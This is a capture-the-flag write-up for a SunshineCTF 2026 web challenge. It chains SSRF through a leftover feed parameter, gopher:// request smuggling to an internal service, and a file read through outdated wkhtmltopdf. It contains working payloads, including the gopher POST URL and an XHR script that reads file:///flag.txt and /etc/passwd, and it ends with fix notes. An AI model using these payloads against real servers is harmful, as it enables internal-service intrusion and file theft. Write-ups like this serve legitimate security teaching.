# Groundhog Day — SunshineCTF 2026 (web, 469)

**Flag:** `sun{s1x_m0r3_w33ks_0f_g0ph3r_ssrf}`

**Target:** https://odyssey.web.2026.sunshinectf.games

---

## TL;DR

An HTML comment on the console leaks a server-side fetch primitive (`/?feed=<url>`).
The fetcher is PycURL/libcurl, so `gopher://` turns the SSRF into arbitrary TCP and
lets us POST to an internal-only Flask app on `127.0.0.1:8000`. That app renders
attacker HTML to a PDF with **wkhtmltopdf 0.12.5**, which still allows local file
access by default, giving an LFI read of `file:///flag.txt`.

```
/?feed=…                              (public console; PycURL/libcurl fetch)
        │
        └─ gopher://127.0.0.1:8000/_POST /report …   (arbitrary TCP → POST)
                   │
                   └─ wkhtmltopdf 0.12.5 renders HTML
                              │
                              └─ XMLHttpRequest file:///flag.txt → PDF → base64
```

---

## 1. The exposed feed override

The landing page ends with an "ops" comment:

```html
<!-- ops: console pulls station JSON at boot from http://127.0.0.1:8000/feed.
     override it with feed=<url> when PUNX-1 is down and you need to point at
     a spare station. manual override panel below, re-enable it next outage.
     remove before public launch.

<form class="override" action="/" method="post">
  <label for="feed">Station feed URL</label>
  <input id="feed" name="feed" type="text" size="60" value="http://127.0.0.1:8000/feed">
  ...
-->
<!-- feed-debug: source=http://127.0.0.1:8000/feed bytes=353 -->
```

The form is commented out in the HTML, but the server still honours the `feed`
parameter. The page also echoes a `feed-debug` comment with the fetched source URL
and byte count, and dumps the raw upstream response into `<pre class="tape">` — a
very convenient oracle for blind SSRF.

```
GET /?feed=http://127.0.0.1:8000/  →  200, tape = internal service index
```

```text
PUNXSUTAWNEY ORBITAL WEATHER AUTHORITY -- BUREAU ARCHIVE (internal)
====================================================================
Staff endpoints. Do not expose to the public console.

  GET  /feed      Current randomised observation for station PUNX-1, as JSON.
  GET  /health    Liveness probe.
  POST /report    Render an archival PDF from a report body.
                  Content-Type: application/x-www-form-urlencoded
                  Fields: content, title
                  Returns JSON; the document comes back base64 in `data`.

NOTE(ops): ... mainly updating from wkhtmltopdf 0.12.5
```

The last line is the intended hint: the PDF renderer is pinned to an old,
vulnerable wkhtmltopdf.

## 2. Identifying the fetcher — PycURL/libcurl

Pointing the feed at a reflection endpoint reveals the HTTP client:

```
GET /?feed=http://httpbin.org/get
```

```json
{ "headers": { "User-Agent": "PycURL/7.47.0 libcurl/8.14.1 OpenSSL/3.5.8 ..." } }
```

That is the key detail. The console itself only ever issues **GET**, and
`/report` is **POST-only** (405 on GET), so the SSRF alone is not enough —
but libcurl supports the `gopher://` scheme.

Notes gathered along the way:
- Plain `http(s)://` works for `http://`; `https://` returned 0 bytes (no CA bundle).
- `file://` and `dict://` returned 0 bytes (disabled / unusable here).
- Error messages are swallowed — a closed port just yields `(no data returned)`.

## 3. `gopher://` → arbitrary POST

`gopher://127.0.0.1:8000/_<data>` makes libcurl open a raw TCP connection and send
`<data>` verbatim (percent-decoding applied), so we can hand-write a complete HTTP
request. A GET first, to prove the primitive:

```
GET /?feed=gopher://127.0.0.1:8000/_GET%20/health%20HTTP/1.0%0D%0A%0D%0A
```

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.13.7
Content-Type: text/plain; charset=utf-8

ok
```

Then the POST to `/report`. The gopher payload is the raw request with CRLF line
endings; `Content-Length` must match the form-encoded body:

```
gopher://127.0.0.1:8000/_POST%20/report%20HTTP/1.1%0D%0AHost:%20127.0.0.1:8000
%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0AContent-Length:%20…%0D%0A
Connection:%20close%0D%0A%0D%0Acontent=…&title=…
```

The response is JSON:

```json
{ "document": "archive-feb-02.pdf", "bytes": 14508, "encoding": "base64", "data": "JVBERi0x…" }
```

## 4. wkhtmltopdf 0.12.5 → local file read

From 0.12.6 onward wkhtmltopdf blocks local file access unless
`--enable-local-file-access` is passed; **0.12.5 still allows it by default**,
which is exactly what the ops note was complaining about.

Which primitive actually reads a file matters:

| Payload in `content`                              | Result |
|---------------------------------------------------|--------|
| `<h1>HELLO</h1>`                                  | text renders (baseline) |
| `<script>document.write("JSTEST")</script>`       | JS executes |
| `<iframe src="file:///etc/passwd">`               | empty |
| `<object data="file:///etc/passwd">`              | empty |
| `<embed src="file:///etc/passwd">`                | empty |
| `<img src="file:///etc/passwd">`                  | empty |
| **XHR + `document.write`**                        | **reads the file** |

The working payload:

```html
<script>
  var x = new XMLHttpRequest();
  x.open("GET", "file:///flag.txt", false);
  x.send();
  document.write("<pre>" + x.responseText + "</pre>");
</script>
```

The file contents are rasterised/embedded into the PDF, which comes back base64 —
decode it and run `pdftotext` to recover the text.

```text
$ pdftotext -layout out.pdf -
root:x:0:0:root:/root:/bin/sh          # /etc/passwd — confirms the LFI
sun{s1x_m0r3_w33ks_0f_g0ph3r_ssrf}    # /flag.txt
```

## 5. Root cause summary

1. **Server-side request forgery** via the undocumented `feed` parameter, with a
   libcurl-based client that permits `gopher://` → full TCP control, not just GET.
2. **Internal service exposed only to localhost** was considered safe, but is
   reachable through the SSRF; its `/report` endpoint is POST-only, which gopher
   bypasses.
3. **Outdated wkhtmltopdf (0.12.5)** with default local-file access → arbitrary
   file read inside the container.

## 6. Reproduce

```bash
python3 solver.py            # defaults to /flag.txt
python3 solver.py /etc/passwd
```

Requirements: `python3`, `requests`, and `pdftotext` (poppler-utils).

## 7. Fix notes

- Remove the `feed` override entirely (as the ops comment intended), or pin it to
  an allow-list of hosts and **restrict the URL scheme** (`http`/`https` only).
- Upgrade wkhtmltopdf (≥ 0.12.6) and do not enable local file access; ideally
  render in a sandbox with no filesystem or network reach.
- Do not treat "localhost-only" as an authorization boundary.
